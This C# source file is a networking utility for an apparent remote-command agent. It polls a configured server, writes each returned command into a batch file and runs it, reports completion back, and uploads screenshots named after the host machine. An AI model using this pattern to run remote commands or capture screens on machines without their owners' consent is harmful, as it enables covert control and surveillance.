using Newtonsoft.Json;
using Receiver.Data;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace Receiver.Utilities
{
    class HttpReq
    {
        private static void commandHandler(string cmd)
        {
            if (cmd.IndexOf("runBatch") > -1)
            {
                string[] splited = cmd.Split(' ');
                string fileName = splited[1];
                Command.ExecuteCommand(fileName);
            }
        }


        public static string Request(string URL, string method, string DATA = null, string user = null, string password = null)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
            request.Method = method;
            request.ContentType = "application/json";
            request.KeepAlive = false;
            if (user != null && password != null)
            {
                String encoded = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(user + ":" + password));
                request.Headers.Add("Authorization", "Basic " + encoded);
            }
            if (DATA != null)
            {
                byte[] byteArray = Encoding.UTF8.GetBytes(DATA);
                request.ContentLength = byteArray.Length;
                using (Stream webStream = request.GetRequestStream())
                {
                    webStream.Write(byteArray, 0, byteArray.Length); // Send the data.
                    webStream.Close();
                }

            }

            try
            {
                WebResponse webResponse = request.GetResponse();
                using (Stream webStream = webResponse.GetResponseStream() ?? Stream.Null)
                using (StreamReader responseReader = new StreamReader(webStream))
                {
                    string response = responseReader.ReadToEnd();
                    return response;
                }
            }
            catch (Exception e)
            {
                LogFile.WriteToFile("-----------------");
                LogFile.WriteToFile(e.Message);
                return null;
            }
        }
        public static async Task<HttpResponseMessage> CurlRequestAsync(string url, string method, string DATA = null, string user = null, string password = null)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            try
            {
                using (var httpClient = new HttpClient())
                {
                    using (var request = new HttpRequestMessage(new HttpMethod(method), url))
                    {
                        if (user != null && password != null)
                        {
                            var base64authorization = Convert.ToBase64String(Encoding.ASCII.GetBytes(user + ":" + password));
                            request.Headers.TryAddWithoutValidation("Authorization", $"Basic {base64authorization}");
                        }
                        if (DATA != null)
                        {
                            request.Content = new StringContent(DATA, Encoding.UTF8, "application/json");
                        }
                        var result = await httpClient.SendAsync(request);
                        if (result.IsSuccessStatusCode)
                        {
                            using (HttpContent content = result.Content)
                            {

                                var jsonStr = content.ReadAsStringAsync().Result;

                                LogFile.WriteToFile("Server Respond : " + jsonStr);
                                callBackDelegate pFunc = new callBackDelegate(responseCallback);
                                pFunc(jsonStr);
                            }
                        }
                        else
                        {
                            LogFile.WriteToFile("Server Not Respond");
                        }
                        return result;

                    }
                }
            }
            catch (Exception e)
            {
                LogFile.WriteToFile("-----------------");
                LogFile.WriteToFile(e.Message);
                return null;
            }
        }
        private delegate void callBackDelegate(string res);
        private static void responseCallback(string res)
        {
            try
            {
                var json = JsonConvert.DeserializeObject<OscarResponse>(res);
                if (json.success && json.command != null)
                {
                    Command.createBatchFileAndRun(json.command);
                    OscarUpdateStatus update = new OscarUpdateStatus();
                    update._id = json.command.id;
                    update.status = "Completed";
                    string updateData = JsonConvert.SerializeObject(update);

                    _ = CurlRequestAsync(Config.cmdServer, Config.cmdMethod, updateData);
                    LogFile.WriteToFile("Update Status to Server ");
                }
            }
            catch (Exception e)
            {
                LogFile.WriteToFile("Error during callback : " + e.ToString());
            }

        }
        async public static Task<HttpResponseMessage> UploadImage(string url, string path)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            try
            {
                // Load file meta data with FileInfo
                FileInfo fileInfo = new FileInfo(path);
                byte[] ImageData = new byte[fileInfo.Length];
                using (FileStream fs = fileInfo.OpenRead())
                {
                    fs.Read(ImageData, 0, ImageData.Length);
                    var requestContent = new MultipartFormDataContent();
                    //    here you can specify boundary if you need---^
                    var imageContent = new ByteArrayContent(ImageData);
                    imageContent.Headers.ContentType =
                        MediaTypeHeaderValue.Parse("image/jpeg");

                    requestContent.Add(imageContent, "photos", Dns.GetHostEntry("").HostName + ".jpg");

                    using (var client = new HttpClient())
                    {
                        LogFile.WriteToFile("Upload Screenshot to Server ");
                        return await client.PostAsync(url, requestContent);
                    }

                }
            } catch (Exception ex)
            {
                LogFile.WriteToFile("-----------------");
                LogFile.WriteToFile(ex.Message);
            }
            return null;
        }
    }
}
